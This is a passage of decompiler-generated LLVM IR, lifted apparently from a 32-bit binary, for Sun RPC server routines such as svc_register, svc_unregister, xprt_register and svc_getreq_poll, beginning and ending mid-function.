  %v0_80568d8 = load i32, i32* @ebp, align 4
  %v2_80568d8 = add i32 %v2_80568f5, -1
  %v3_80568d8 = add i32 %v2_80568d8, %v0_80568d8
  %v1_80568dd = call i32 @svc_getreq_common(i32 %v3_80568d8)
  %v0_80568e2 = load i32, i32* @ebx, align 4
  %v1_80568e2 = add i32 %v0_80568e2, -1
  %v2_80568ea = urem i32 %v1_80568e2, 32
  %v4_80568ea = icmp eq i32 %v2_80568ea, 0
  br i1 %v4_80568ea, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_80568d5
  %v5_80568ea = shl i32 1, %v2_80568ea
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_80568d5, %bb
  %v1_80568ef = phi i32 [ 1, %dec_label_pc_80568d5 ], [ %v5_80568ea, %bb ]
  %v0_80568ef = load i32, i32* @esi, align 4
  %v2_80568ef = xor i32 %v0_80568ef, %v1_80568ef
  br label %dec_label_pc_80568f1

dec_label_pc_80568f1:                             ; preds = %dec_label_pc_80568d1, %bb16
  %storemerge = phi i32 [ %v2_80568d1, %dec_label_pc_80568d1 ], [ %v2_80568ef, %bb16 ]
  store i32 %storemerge, i32* @esi, align 4
  %v1_80568f5 = trunc i32 %storemerge to i16
  %v2_80568f5 = call i32 @ffs(i16 %v1_80568f5)
  %v1_80568fd = icmp eq i32 %v2_80568f5, 0
  store i32 %v2_80568f5, i32* @ebx, align 4
  %v1_8056901 = icmp eq i1 %v1_80568fd, false
  br i1 %v1_8056901, label %dec_label_pc_80568d5, label %dec_label_pc_8056903

dec_label_pc_8056903:                             ; preds = %dec_label_pc_80568f1
  %v0_8056903 = load i32, i32* @edi, align 4
  %v1_8056903 = add i32 %v0_8056903, 4
  store i32 %v1_8056903, i32* @edi, align 4
  %v0_8056906 = load i32, i32* @ebp, align 4
  %v1_8056906 = add i32 %v0_8056906, 32
  store i32 %v1_8056906, i32* @ebp, align 4
  %v5_805690d = icmp slt i32 %v1_8056906, %v2_80568c2
  br i1 %v5_805690d, label %dec_label_pc_80568d1, label %dec_label_pc_805690f

dec_label_pc_805690f:                             ; preds = %dec_label_pc_8056903, %entry.dec_label_pc_805690f_crit_edge
  %v0_8056916.lcssa = phi i32 [ %v2_80568c2, %entry.dec_label_pc_805690f_crit_edge ], [ %v2_80568f5, %dec_label_pc_8056903 ]
  ret i32 %v0_8056916.lcssa

; uselistorder directives
  uselistorder i32 %v1_8056903, { 1, 0 }
  uselistorder i32 %v2_80568f5, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80568ea, { 1, 0 }
  uselistorder i32 %v2_80568c2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80568f1, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_80568d1, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
  %v2_8056925 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8056925, i32* @edx, align 4
  %tmp8 = bitcast i32* %stack_var_-132 to i8*
  store i32 %v2_8056925, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8056930 = call i8* @_memset(i8* %tmp8, i32 0, i32 32)
  store i32 %arg1, i32* %stack_var_-132, align 4
  %v2_8056945 = call i32 @svc_getreqset(i32* nonnull %stack_var_-132)
  ret i32 %v2_8056945

; uselistorder directives
  uselistorder i32* %stack_var_-132, { 0, 2, 1, 3 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056952 = load i32, i32* @ebp, align 4
  %v0_8056953 = load i32, i32* @edi, align 4
  %v0_8056954 = load i32, i32* @esi, align 4
  %v0_8056955 = load i32, i32* @ebx, align 4
  store i32 %v0_8056955, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebp, align 4
  %v2_805695d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805695d, i32* @ecx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  %v3_8056969 = call i32 @svc_find(i32 %v0_8056955, i32 %v0_8056954, i32 %v0_8056953)
  %v1_805696e = icmp eq i32 %v3_8056969, 0
  store i32 %v3_8056969, i32* @ebx, align 4
  br i1 %v1_805696e, label %entry.dec_label_pc_80569a8_crit_edge, label %dec_label_pc_8056974

entry.dec_label_pc_80569a8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80569a8

dec_label_pc_8056974:                             ; preds = %entry
  %v3_8056974 = load i32, i32* %stack_var_-20, align 4
  %v1_8056978 = inttoptr i32 %v3_8056969 to i32*
  %v2_8056978 = load i32, i32* %v1_8056978, align 4
  store i32 %v2_8056978, i32* @esi, align 4
  %v1_805697a = icmp eq i32 %v3_8056974, 0
  %v1_805697c = icmp eq i1 %v1_805697a, false
  br i1 %v1_805697c, label %dec_label_pc_805698b, label %dec_label_pc_805697e

dec_label_pc_805697e:                             ; preds = %dec_label_pc_8056974
  %v0_805697e = load i32, i32* %stack_var_-16, align 4
  %v1_805697e = call i32 @__rpc_thread_variables(i32 %v0_805697e)
  %v0_8056983 = load i32, i32* @esi, align 4
  %v2_8056983 = add i32 %v1_805697e, 184
  %v3_8056983 = inttoptr i32 %v2_8056983 to i32*
  store i32 %v0_8056983, i32* %v3_8056983, align 4
  br label %dec_label_pc_805698d

dec_label_pc_805698b:                             ; preds = %dec_label_pc_8056974
  %v2_805698b = inttoptr i32 %v3_8056974 to i32*
  store i32 %v2_8056978, i32* %v2_805698b, align 4
  br label %dec_label_pc_805698d

dec_label_pc_805698d:                             ; preds = %dec_label_pc_805697e, %dec_label_pc_805698b
  %v0_8056990 = load i32, i32* @ebx, align 4
  %v1_8056990 = inttoptr i32 %v0_8056990 to i32*
  store i32 0, i32* %v1_8056990, align 4
  %v0_8056996 = load i32, i32* @ebx, align 4
  %v1_8056997 = call i32 @free(i32 %v0_8056996)
  %v0_805699e = load i32, i32* @edi, align 4
  %v1_80569a0 = call i32 @__GI_pmap_unset(i32 %v0_805699e)
  br label %dec_label_pc_80569a8

dec_label_pc_80569a8:                             ; preds = %entry.dec_label_pc_80569a8_crit_edge, %dec_label_pc_805698d
  %v0_80569af = phi i32 [ 0, %entry.dec_label_pc_80569a8_crit_edge ], [ %v1_80569a0, %dec_label_pc_805698d ]
  %v2_80569ab = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80569ab, i32* @ebx, align 4
  store i32 %v0_8056954, i32* @esi, align 4
  store i32 %v0_8056953, i32* @edi, align 4
  store i32 %v0_8056952, i32* @ebp, align 4
  ret i32 %v0_80569af

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80569a8, { 1, 0 }
  uselistorder label %dec_label_pc_805698d, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  br label %dec_label_pc_80569c5

dec_label_pc_80569b5:                             ; preds = %dec_label_pc_80569c5
  %v0_80569b5 = load i32, i32* @ecx, align 4
  %v1_80569b7 = add i32 %v3_80569ca, 8
  %v2_80569b7 = inttoptr i32 %v1_80569b7 to i32*
  %v3_80569b7 = load i32, i32* %v2_80569b7, align 4
  %v1_80569ba = add i32 %v3_80569ca, 4
  %v2_80569ba = inttoptr i32 %v1_80569ba to i32*
  %v3_80569ba = load i32, i32* %v2_80569ba, align 4
  %v4_80569bd = call i32 @svc_unregister(i32 %v3_80569ba, i32 %v3_80569b7, i32 %v0_80569b5, i32 %v0_80569b5)
  br label %dec_label_pc_80569c5

dec_label_pc_80569c5:                             ; preds = %entry, %dec_label_pc_80569b5
  %v0_80569c5 = phi i32 [ %v3_80569ba, %dec_label_pc_80569b5 ], [ %tmp7, %entry ]
  %v1_80569c5 = call i32 @__rpc_thread_variables(i32 %v0_80569c5)
  %v1_80569ca = add i32 %v1_80569c5, 184
  %v2_80569ca = inttoptr i32 %v1_80569ca to i32*
  %v3_80569ca = load i32, i32* %v2_80569ca, align 4
  %v1_80569d0 = icmp eq i32 %v3_80569ca, 0
  %v1_80569d2 = icmp eq i1 %v1_80569d0, false
  br i1 %v1_80569d2, label %dec_label_pc_80569b5, label %dec_label_pc_80569d4

dec_label_pc_80569d4:                             ; preds = %dec_label_pc_80569c5
  ret i32 %v3_80569ca

; uselistorder directives
  uselistorder i32 %v3_80569ca, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80569c5, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_80569d9 = load i32, i32* @edi, align 4
  %v0_80569da = load i32, i32* @esi, align 4
  %v0_80569db = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_80569e3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80569e3, i32* @ecx, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg3, i32* @edx, align 4
  %v3_80569f3 = call i32 @svc_find(i32 %v0_80569db, i32 %v0_80569da, i32 %v0_80569d9)
  store i32 %v3_80569f3, i32* %eax.global-to-local, align 4
  %v1_80569f8 = icmp eq i32 %v3_80569f3, 0
  br i1 %v1_80569f8, label %dec_label_pc_8056a03, label %dec_label_pc_80569fc

dec_label_pc_80569fc:                             ; preds = %entry
  %v1_80569fc = add i32 %v3_80569f3, 12
  %v2_80569fc = inttoptr i32 %v1_80569fc to i32*
  %v3_80569fc = load i32, i32* %v2_80569fc, align 4
  %v4_80569fc = load i32, i32* @ebp, align 4
  %v15_80569fc = icmp eq i32 %v3_80569fc, %v4_80569fc
  %v1_80569ff = icmp eq i1 %v15_80569fc, false
  br i1 %v1_80569ff, label %dec_label_pc_8056a57, label %dec_label_pc_8056a32

dec_label_pc_8056a03:                             ; preds = %entry
  store i32 16, i32* %stack_var_-60, align 4
  %v1_8056a08 = call i32 @malloc(i32 16)
  store i32 %v1_8056a08, i32* %eax.global-to-local, align 4
  %v1_8056a10 = icmp eq i32 %v1_8056a08, 0
  store i32 %v1_8056a08, i32* @ebx, align 4
  br i1 %v1_8056a10, label %dec_label_pc_8056a57, label %dec_label_pc_8056a16

dec_label_pc_8056a16:                             ; preds = %dec_label_pc_8056a03
  %v0_8056a16 = load i32, i32* @edi, align 4
  %v2_8056a16 = add i32 %v1_8056a08, 4
  %v3_8056a16 = inttoptr i32 %v2_8056a16 to i32*
  store i32 %v0_8056a16, i32* %v3_8056a16, align 4
  %v0_8056a19 = load i32, i32* @esi, align 4
  %v1_8056a19 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a19 = add i32 %v1_8056a19, 8
  %v3_8056a19 = inttoptr i32 %v2_8056a19 to i32*
  store i32 %v0_8056a19, i32* %v3_8056a19, align 4
  %v0_8056a1c = load i32, i32* @ebp, align 4
  %v1_8056a1c = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a1c = add i32 %v1_8056a1c, 12
  %v3_8056a1c = inttoptr i32 %v2_8056a1c to i32*
  store i32 %v0_8056a1c, i32* %v3_8056a1c, align 4
  %v0_8056a1f = load i32, i32* %stack_var_-60, align 4
  %v1_8056a1f = call i32 @__rpc_thread_variables(i32 %v0_8056a1f)
  store i32 %v1_8056a1f, i32* %eax.global-to-local, align 4
  %v1_8056a24 = add i32 %v1_8056a1f, 184
  %v2_8056a24 = inttoptr i32 %v1_8056a24 to i32*
  %v3_8056a24 = load i32, i32* %v2_8056a24, align 4
  %v1_8056a2a = load i32, i32* @ebx, align 4
  %v2_8056a2a = inttoptr i32 %v1_8056a2a to i32*
  store i32 %v3_8056a24, i32* %v2_8056a2a, align 4
  %v0_8056a2c = load i32, i32* @ebx, align 4
  store i32 %v0_8056a2c, i32* %v2_8056a24, align 4
  br label %dec_label_pc_8056a32

dec_label_pc_8056a32:                             ; preds = %dec_label_pc_80569fc, %dec_label_pc_8056a16
  %v4_8056a32 = icmp eq i32 %arg5, 0
  store i32 1, i32* %eax.global-to-local, align 4
  br i1 %v4_8056a32, label %dec_label_pc_8056a59, label %dec_label_pc_8056a3e

dec_label_pc_8056a3e:                             ; preds = %dec_label_pc_8056a32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8056a42 = add i32 %arg1, 4
  %v2_8056a42 = inttoptr i32 %v1_8056a42 to i16*
  %v3_8056a42 = load i16, i16* %v2_8056a42, align 2
  %v4_8056a42 = zext i16 %v3_8056a42 to i32
  store i32 %v4_8056a42, i32* %eax.global-to-local, align 4
  %v0_8056a4b = load i32, i32* @esi, align 4
  %v0_8056a4c = load i32, i32* @edi, align 4
  store i32 %v0_8056a4c, i32* %stack_var_-60, align 4
  %v5_8056a4d = call i32 @pmap_set(i32 %v0_8056a4c, i32 %v0_8056a4b, i32 %arg5, i16 %v3_8056a42)
  store i32 %v5_8056a4d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056a59

dec_label_pc_8056a57:                             ; preds = %dec_label_pc_8056a03, %dec_label_pc_80569fc
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056a59

dec_label_pc_8056a59:                             ; preds = %dec_label_pc_8056a32, %dec_label_pc_8056a3e, %dec_label_pc_8056a57
  %v0_8056a60 = phi i32 [ 1, %dec_label_pc_8056a32 ], [ %v5_8056a4d, %dec_label_pc_8056a3e ], [ 0, %dec_label_pc_8056a57 ]
  ret i32 %v0_8056a60

; uselistorder directives
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @svc_find, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056a59, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056a32, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8056a61 = load i32, i32* @esi, align 4
  %v0_8056a62 = load i32, i32* @ebx, align 4
  store i32 %v0_8056a62, i32* %stack_var_-8, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_8056a6a = load i32, i32* %arg1, align 4
  store i32 %v2_8056a6a, i32* @ebx, align 4
  %v2_8056a6c = call i32 @_rpc_dtablesize(i32 %v0_8056a62, i32 %v0_8056a61)
  %v0_8056a71 = load i32, i32* @ebx, align 4
  %v5_8056a73 = icmp slt i32 %v0_8056a71, %v2_8056a6c
  br i1 %v5_8056a73, label %dec_label_pc_8056a75, label %dec_label_pc_8056ad4

dec_label_pc_8056a75:                             ; preds = %entry
  %v0_8056a75 = load i32, i32* %stack_var_-8, align 4
  %v1_8056a75 = call i32 @__rpc_thread_variables(i32 %v0_8056a75)
  %v0_8056a7a = load i32, i32* @ebx, align 4
  %v1_8056a7a = mul i32 %v0_8056a7a, 4
  %v1_8056a81 = add i32 %v1_8056a75, 180
  %v2_8056a81 = inttoptr i32 %v1_8056a81 to i32*
  %v3_8056a81 = load i32, i32* %v2_8056a81, align 4
  %v2_8056a87 = add i32 %v3_8056a81, %v1_8056a7a
  %v3_8056a87 = inttoptr i32 %v2_8056a87 to i32*
  %v4_8056a87 = load i32, i32* %v3_8056a87, align 4
  %v5_8056a87 = load i32, i32* @esi, align 4
  %v16_8056a87 = icmp eq i32 %v4_8056a87, %v5_8056a87
  %v1_8056a8a = icmp eq i1 %v16_8056a87, false
  br i1 %v1_8056a8a, label %dec_label_pc_8056ad4, label %dec_label_pc_8056a8c

dec_label_pc_8056a8c:                             ; preds = %dec_label_pc_8056a75
  %v1_8056a8c = add i32 %v0_8056a7a, -1023
  %v6_8056a8c = sub i32 1022, %v0_8056a7a
  %v7_8056a8c = and i32 %v6_8056a8c, %v0_8056a7a
  %v8_8056a8c = icmp slt i32 %v7_8056a8c, 0
  %v9_8056a8c = icmp eq i32 %v1_8056a8c, 0
  %v10_8056a8c = icmp slt i32 %v1_8056a8c, 0
  store i32 0, i32* %v3_8056a87, align 4
  %v3_8056a99 = icmp eq i1 %v10_8056a8c, %v8_8056a8c
  %v4_8056a99 = icmp eq i1 %v9_8056a8c, false
  %v5_8056a99 = and i1 %v4_8056a99, %v3_8056a99
  br i1 %v5_8056a99, label %dec_label_pc_8056aae, label %dec_label_pc_8056a9b

dec_label_pc_8056a9b:                             ; preds = %dec_label_pc_8056a8c
  %v0_8056a9b = call i32 @__GI___rpc_thread_svc_fdset()
  %v0_8056aa0 = load i32, i32* @ebx, align 4
  %v2_8056aa4 = udiv i32 %v0_8056aa0, 32
  store i32 %v2_8056aa4, i32* @ecx, align 4
  %v1_8056aa7 = urem i32 %v0_8056aa0, 32
  %v2_8056aaa = mul nuw nsw i32 %v2_8056aa4, 4
  %v3_8056aaa = add i32 %v2_8056aaa, %v0_8056a9b
  %v4_8056aaa = inttoptr i32 %v3_8056aaa to i32*
  %v5_8056aaa = load i32, i32* %v4_8056aaa, align 4
  %v8_8056aaa = shl i32 1, %v1_8056aa7
  %v11_8056aaa = sub i32 -1, %v8_8056aaa
  %v12_8056aaa = and i32 %v5_8056aaa, %v11_8056aaa
  store i32 %v12_8056aaa, i32* %v4_8056aaa, align 4
  br label %dec_label_pc_8056aae

dec_label_pc_8056aae:                             ; preds = %dec_label_pc_8056a8c, %dec_label_pc_8056a9b
  br label %dec_label_pc_8056acb

dec_label_pc_8056ab2:                             ; preds = %dec_label_pc_8056acb
  %v0_8056ab2 = call i32 @__rpc_thread_svc_pollfd()
  %v0_8056ab7 = load i32, i32* @esi, align 4
  %v1_8056ab7 = mul i32 %v0_8056ab7, 8
  %v2_8056abe = inttoptr i32 %v0_8056ab2 to i32*
  %v3_8056abe = load i32, i32* %v2_8056abe, align 4
  %v4_8056abe = add i32 %v3_8056abe, %v1_8056ab7
  %v1_8056ac0 = inttoptr i32 %v4_8056abe to i32*
  %v2_8056ac0 = load i32, i32* %v1_8056ac0, align 4
  %v3_8056ac0 = load i32, i32* @ebx, align 4
  %v14_8056ac0 = icmp eq i32 %v2_8056ac0, %v3_8056ac0
  %v1_8056ac2 = icmp eq i1 %v14_8056ac0, false
  br i1 %v1_8056ac2, label %dec_label_pc_8056aca, label %dec_label_pc_8056ac4

dec_label_pc_8056ac4:                             ; preds = %dec_label_pc_8056ab2
  store i32 -1, i32* %v1_8056ac0, align 4
  %v0_8056aca.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056aca

dec_label_pc_8056aca:                             ; preds = %dec_label_pc_8056ab2, %dec_label_pc_8056ac4
  %v0_8056aca = phi i32 [ %v0_8056ab7, %dec_label_pc_8056ab2 ], [ %v0_8056aca.pre, %dec_label_pc_8056ac4 ]
  %v1_8056aca = add i32 %v0_8056aca, 1
  br label %dec_label_pc_8056acb

dec_label_pc_8056acb:                             ; preds = %dec_label_pc_8056aae, %dec_label_pc_8056aca
  %storemerge = phi i32 [ 0, %dec_label_pc_8056aae ], [ %v1_8056aca, %dec_label_pc_8056aca ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_8056acb = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_8056ad0 = load i32, i32* @esi, align 4
  %v2_8056ad0 = inttoptr i32 %v0_8056acb to i32*
  %v3_8056ad0 = load i32, i32* %v2_8056ad0, align 4
  %v5_8056ad2 = icmp slt i32 %v0_8056ad0, %v3_8056ad0
  br i1 %v5_8056ad2, label %dec_label_pc_8056ab2, label %dec_label_pc_8056ad4

dec_label_pc_8056ad4:                             ; preds = %dec_label_pc_8056acb, %entry, %dec_label_pc_8056a75
  %v0_8056ad7 = phi i32 [ %v2_8056a6c, %entry ], [ %v3_8056a81, %dec_label_pc_8056a75 ], [ %v0_8056acb, %dec_label_pc_8056acb ]
  %v2_8056ad5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056ad5, i32* @ebx, align 4
  store i32 %v0_8056a61, i32* @esi, align 4
  ret i32 %v0_8056ad7

; uselistorder directives
  uselistorder i32 %v2_8056aa4, { 1, 0 }
  uselistorder i32 %v0_8056aa0, { 1, 0 }
  uselistorder i32 %v1_8056a8c, { 1, 0 }
  uselistorder i32 %v3_8056a81, { 1, 0 }
  uselistorder i32 %v0_8056a7a, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056ad4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056acb, { 1, 0 }
  uselistorder label %dec_label_pc_8056aca, { 1, 0 }
  uselistorder label %dec_label_pc_8056aae, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_8056adf = load i32, i32* @ebx, align 4
  store i32 %v0_8056adf, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  br label %dec_label_pc_8056b29

dec_label_pc_8056ae9:                             ; preds = %dec_label_pc_8056b32
  %v2_8056aed = mul i32 %v0_8056b2e, 8
  %v3_8056aed = add i32 %v2_8056aed, %arg1
  %v1_8056af0 = inttoptr i32 %v3_8056aed to i32*
  %v2_8056af0 = load i32, i32* %v1_8056af0, align 4
  store i32 %v2_8056af0, i32* @ebx, align 4
  %v10_8056af2 = icmp eq i32 %v2_8056af0, -1
  br i1 %v10_8056af2, label %dec_label_pc_8056b28, label %dec_label_pc_8056af7

dec_label_pc_8056af7:                             ; preds = %dec_label_pc_8056ae9
  %v1_8056af7 = add i32 %v3_8056aed, 6
  %v2_8056af7 = inttoptr i32 %v1_8056af7 to i16*
  %v3_8056af7 = load i16, i16* %v2_8056af7, align 2
  %v5_8056af7 = trunc i16 %v3_8056af7 to i8
  %v2_8056afb = icmp eq i8 %v5_8056af7, 0
  br i1 %v2_8056afb, label %dec_label_pc_8056b28, label %dec_label_pc_8056aff

dec_label_pc_8056aff:                             ; preds = %dec_label_pc_8056af7
  %v1_8056aff = add i32 %v0_8056b32, 1
  store i32 %v1_8056aff, i32* @edi, align 4
  %v3_8056b00 = and i8 %v5_8056af7, 32
  %v4_8056b00 = icmp eq i8 %v3_8056b00, 0
  br i1 %v4_8056b00, label %dec_label_pc_8056b1c, label %dec_label_pc_8056b04

dec_label_pc_8056b04:                             ; preds = %dec_label_pc_8056aff
  %v0_8056b04 = load i32, i32* %stack_var_-16, align 4
  %v1_8056b04 = call i32 @__rpc_thread_variables(i32 %v0_8056b04)
  %v1_8056b0c = add i32 %v1_8056b04, 180
  %v2_8056b0c = inttoptr i32 %v1_8056b0c to i32*
  %v3_8056b0c = load i32, i32* %v2_8056b0c, align 4
  %v1_8056b12 = load i32, i32* @ebx, align 4
  %v2_8056b12 = mul i32 %v1_8056b12, 4
  %v3_8056b12 = add i32 %v2_8056b12, %v3_8056b0c
  %v4_8056b12 = inttoptr i32 %v3_8056b12 to i32*
  %v5_8056b12 = load i32, i32* %v4_8056b12, align 4
  %v1_8056b15 = inttoptr i32 %v5_8056b12 to i32*
  %v2_8056b15 = call i32 @xprt_unregister(i32* %v1_8056b15)
  br label %dec_label_pc_8056b25

dec_label_pc_8056b1c:                             ; preds = %dec_label_pc_8056aff
  %v1_8056b20 = call i32 @svc_getreq_common(i32 %v2_8056af0)
  br label %dec_label_pc_8056b25

dec_label_pc_8056b25:                             ; preds = %dec_label_pc_8056b04, %dec_label_pc_8056b1c
  %v0_8056b28.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056b28

dec_label_pc_8056b28:                             ; preds = %dec_label_pc_8056af7, %dec_label_pc_8056ae9, %dec_label_pc_8056b25
  %v0_8056b28 = phi i32 [ %v0_8056b2e, %dec_label_pc_8056af7 ], [ %v0_8056b2e, %dec_label_pc_8056ae9 ], [ %v0_8056b28.pre, %dec_label_pc_8056b25 ]
  %v1_8056b28 = add i32 %v0_8056b28, 1
  store i32 %v1_8056b28, i32* @esi, align 4
  br label %dec_label_pc_8056b29

dec_label_pc_8056b29:                             ; preds = %entry, %dec_label_pc_8056b28
  %v0_8056b29 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_8056b2e = load i32, i32* @esi, align 4
  %v2_8056b2e = inttoptr i32 %v0_8056b29 to i32*
  %v3_8056b2e = load i32, i32* %v2_8056b2e, align 4
  %v5_8056b30 = icmp slt i32 %v0_8056b2e, %v3_8056b2e
  br i1 %v5_8056b30, label %dec_label_pc_8056b32, label %dec_label_pc_8056b36

dec_label_pc_8056b32:                             ; preds = %dec_label_pc_8056b29
  %v0_8056b32 = load i32, i32* @edi, align 4
  %v1_8056b32 = load i32, i32* @ebp, align 4
  %v5_8056b34 = icmp slt i32 %v0_8056b32, %v1_8056b32
  br i1 %v5_8056b34, label %dec_label_pc_8056ae9, label %dec_label_pc_8056b36

dec_label_pc_8056b36:                             ; preds = %dec_label_pc_8056b29, %dec_label_pc_8056b32
  ret i32 %v0_8056b29

; uselistorder directives
  uselistorder i32 %v0_8056b32, { 1, 0 }
  uselistorder i32 %v0_8056b2e, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8056af0, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %dec_label_pc_8056b36, { 1, 0 }
  uselistorder label %dec_label_pc_8056b29, { 1, 0 }
  uselistorder label %dec_label_pc_8056b28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056b25, { 1, 0 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %stack_var_-24 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-24, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056b3f = load i32, i32* @esi, align 4
  %v0_8056b40 = load i32, i32* @ebx, align 4
  store i32 %v0_8056b40, i32* %stack_var_-12, align 4
  %v1_8056b41 = call i32 @__rpc_thread_variables(i32 %v0_8056b40)
  store i32 %v1_8056b41, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_8056b4a = load i32, i32* %arg1, align 4
  store i32 %v2_8056b4a, i32* @edi, align 4
  %v1_8056b4c = add i32 %v1_8056b41, 180
  %v2_8056b4c = inttoptr i32 %v1_8056b4c to i32*
  %v3_8056b4c = load i32, i32* %v2_8056b4c, align 4
  %v4_8056b4c = icmp eq i32 %v3_8056b4c, 0
  store i32 %v1_8056b41, i32* @ebx, align 4
  %v1_8056b55 = icmp eq i1 %v4_8056b4c, false
  br i1 %v1_8056b55, label %dec_label_pc_8056b79, label %dec_label_pc_8056b57

dec_label_pc_8056b57:                             ; preds = %entry
  %v0_8056b57 = load i32, i32* %stack_var_-12, align 4
  %v2_8056b57 = call i32 @_rpc_dtablesize(i32 %v0_8056b57, i32 %v0_8056b3f)
  %v2_8056b5f = mul i32 %v2_8056b57, 4
  store i32 %v2_8056b5f, i32* %eax.global-to-local, align 4
  store i32 %v2_8056b5f, i32* %stack_var_-28, align 4
  %v1_8056b63 = call i32 @malloc(i32 %v2_8056b5f)
  store i32 %v1_8056b63, i32* %eax.global-to-local, align 4
  %v1_8056b6b = icmp eq i32 %v1_8056b63, 0
  %v1_8056b6d = load i32, i32* @ebx, align 4
  %v2_8056b6d = add i32 %v1_8056b6d, 180
  %v3_8056b6d = inttoptr i32 %v2_8056b6d to i32*
  store i32 %v1_8056b63, i32* %v3_8056b6d, align 4
  br i1 %v1_8056b6b, label %dec_label_pc_8056c13, label %dec_label_pc_8056b57.dec_label_pc_8056b79_crit_edge

dec_label_pc_8056b57.dec_label_pc_8056b79_crit_edge: ; preds = %dec_label_pc_8056b57
  %v0_8056b79.pre = load i32, i32* %stack_var_-28, align 4
  %v1_8056b79.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_8056b79

dec_label_pc_8056b79:                             ; preds = %dec_label_pc_8056b57.dec_label_pc_8056b79_crit_edge, %entry
  %v1_8056b79 = phi i32 [ %v1_8056b79.pre, %dec_label_pc_8056b57.dec_label_pc_8056b79_crit_edge ], [ %tmp9, %entry ]
  %v0_8056b79 = phi i32 [ %v0_8056b79.pre, %dec_label_pc_8056b57.dec_label_pc_8056b79_crit_edge ], [ %tmp8, %entry ]
  %v2_8056b79 = call i32 @_rpc_dtablesize(i32 %v0_8056b79, i32 %v1_8056b79)
  store i32 %v2_8056b79, i32* %eax.global-to-local, align 4
  %v0_8056b7e = load i32, i32* @edi, align 4
  %v5_8056b80 = icmp slt i32 %v0_8056b7e, %v2_8056b79
  br i1 %v5_8056b80, label %dec_label_pc_8056b86, label %dec_label_pc_8056c13

dec_label_pc_8056b86:                             ; preds = %dec_label_pc_8056b79
  %v0_8056b86 = load i32, i32* @ebx, align 4
  %v1_8056b86 = add i32 %v0_8056b86, 180
  %v2_8056b86 = inttoptr i32 %v1_8056b86 to i32*
  %v3_8056b86 = load i32, i32* %v2_8056b86, align 4
